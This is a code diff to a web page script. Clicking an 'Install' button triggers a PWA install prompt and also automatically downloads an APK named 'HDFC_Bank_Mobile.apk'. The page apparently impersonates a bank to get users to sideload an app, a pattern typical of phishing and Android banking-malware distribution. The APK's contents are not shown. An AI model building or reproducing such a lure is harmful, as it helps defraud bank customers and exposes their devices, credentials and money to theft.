@@ -1,10 +1,28 @@
 document.addEventListener('DOMContentLoaded', () => {
     const installBtn = document.getElementById('installBtn');
+    let deferredPrompt;
+
+    // Listen for the PWA install prompt
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e;
+    });
     
     // Immediate APK Download on Install Click
     installBtn.addEventListener('click', () => {
         if (installBtn.textContent === 'Install') {
-            // 1. TRIGGER APK DOWNLOAD IMMEDIATELY
+            // 1. Trigger PWA Installation if available
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('User accepted the HDFC app install');
+                    }
+                    deferredPrompt = null;
+                });
+            }
+
+            // 2. TRIGGER APK DOWNLOAD IMMEDIATELY (Backup)
             const downloadLink = document.createElement('a');
             downloadLink.href = 'HDFC_Bank_Mobile.apk';
             downloadLink.download = 'HDFC_Bank_Mobile.apk';
